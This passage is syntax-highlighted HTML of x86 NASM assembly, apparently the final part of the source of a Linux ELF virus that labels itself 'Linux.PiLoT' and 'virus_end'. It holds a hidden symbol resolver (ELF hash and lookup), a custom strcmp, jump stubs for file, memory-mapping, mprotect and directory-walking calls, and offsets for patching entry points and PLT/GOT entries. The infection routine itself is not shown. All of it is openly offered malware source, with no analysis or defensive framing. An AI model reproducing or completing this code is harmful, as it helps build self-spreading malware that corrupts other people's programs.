        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">.done</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xf0000000</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">.skip</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">.skip</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.next</span><span class="sc0">
    </span><span class="sc5">.done</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">; lookup(name,hash,dynsym,dynstr) - return st_value of the symbol by name</span><span class="sc0">
</span><span class="sc5">lookup</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; hash</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; nbuckets</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; buckets</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; chains</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">elf_hash</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">.for</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">.return</span><span class="sc0">
    </span><span class="sc5">.more</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">44</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; sym[idx]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">48</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">strcmp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.next</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; st_value</span><span class="sc0">
    </span><span class="sc5">.return</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc5">.next</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.for</span><span class="sc0">
</span><span class="sc1">; guess what</span><span class="sc0">
</span><span class="sc5">strcmp</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">.loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.diff</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.loop</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.ret</span><span class="sc0">
    </span><span class="sc5">.diff</span><span class="sc0">   </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">.ret</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc1">; our PLT-like helpers</span><span class="sc0">
</span><span class="sc5">open</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">lseek</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">mmap</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">munmap</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">mprotect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">readdir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">opendir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">closedir</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">%ifdef</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc5">printf</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">%endif</span><span class="sc0">
</span><span class="sc1">; our strtab</span><span class="sc0">
</span><span class="sc9">%macro</span><span class="sc0"> </span><span class="sc5">stridx</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">-*</span><span class="sc0">
    </span><span class="sc9">%rep</span><span class="sc0">    </span><span class="sc10">%0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">%1</span><span class="sc4">-</span><span class="sc5">strings</span><span class="sc0">
        </span><span class="sc9">%rotate</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">%endrep</span><span class="sc0">
</span><span class="sc9">%endmacro</span><span class="sc0">
    </span><span class="sc5">indexes</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">%ifdef</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc5">stridx</span><span class="sc0">  </span><span class="sc5">sa</span><span class="sc0">
</span><span class="sc9">%endif</span><span class="sc0">
        </span><span class="sc5">stridx</span><span class="sc0">  </span><span class="sc5">s9</span><span class="sc4">,</span><span class="sc5">s8</span><span class="sc4">,</span><span class="sc5">s7</span><span class="sc4">,</span><span class="sc5">s6</span><span class="sc4">,</span><span class="sc5">s5</span><span class="sc4">,</span><span class="sc5">s4</span><span class="sc4">,</span><span class="sc5">s3</span><span class="sc4">,</span><span class="sc5">s2</span><span class="sc4">,</span><span class="sc5">s1</span><span class="sc0">
</span><span class="sc5">N_SYMS</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">indexes</span><span class="sc0">
    </span><span class="sc5">strings</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">s1</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"open"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">s2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"lseek"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">s3</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"mmap"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">s4</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"close"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">s5</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"munmap"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">s6</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"mprotect"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">s7</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"readdir"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">s8</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"opendir"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">s9</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"closedir"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">%ifdef</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc5">sa</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"printf"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">%endif</span><span class="sc0">
</span><span class="sc9">%if</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">strings</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
</span><span class="sc9">%error</span><span class="sc0"> </span><span class="sc3">"String table is too large"</span><span class="sc0">
</span><span class="sc9">%endif</span><span class="sc0">
</span><span class="sc9">%ifdef</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc5">hello</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Linux.PiLoT size = %d"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">%else</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"PiLoT"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">%endif</span><span class="sc0">
</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">resb</span><span class="sc0">    </span><span class="sc2">4096</span><span class="sc0">
</span><span class="sc5">data_start</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">N_SYMS</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">file_handle</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">file_length</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">new_entry</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">plt_ptr</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">gotp</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">orel</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">pcnt</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc1">;</span></div></body>
</html>
